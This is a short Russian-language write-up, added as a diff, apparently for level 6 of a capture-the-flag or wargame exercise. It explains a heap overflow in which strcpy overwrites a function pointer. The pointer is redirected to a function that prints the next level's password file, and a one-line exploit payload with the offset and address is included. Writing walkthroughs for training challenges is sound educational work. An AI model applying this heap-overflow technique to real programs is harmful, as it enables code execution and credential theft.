@@ -1,0 +1,30 @@
+# Level 6 - переполнение в куче
+
+### Функция strcpy, используемая в программе, уязвима и допускает переполнение буфера.
+```c
+    strcpy(v5, argv[1]);
+ ```
+
+### С помощью переполнения можно перезаписать данные в куче:
+
+``` c
+    v5 = (char *)malloc(64u);
+    v4 = (int (**)(void))malloc(4u);
+    *v4 = m;
+    strcpy(v5, argv[1]);
+    (*v4)();
+```
+
+### Перепишем адрес v4 на функцию n():
+```c
+int n()
+{
+  return system("/bin/cat /home/user/level7/.pass");
+}
+```
+
+### 1. Подбираем нужное количество данных, чтобы достать до переменной v4. Это (64 + 8) +- 8, зависит от версии либс. В данном случае 72 байта, а после них 4 байта функции n().
+
+```sh
+echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaT\x84\x04\x08" | xargs ./level6
+```
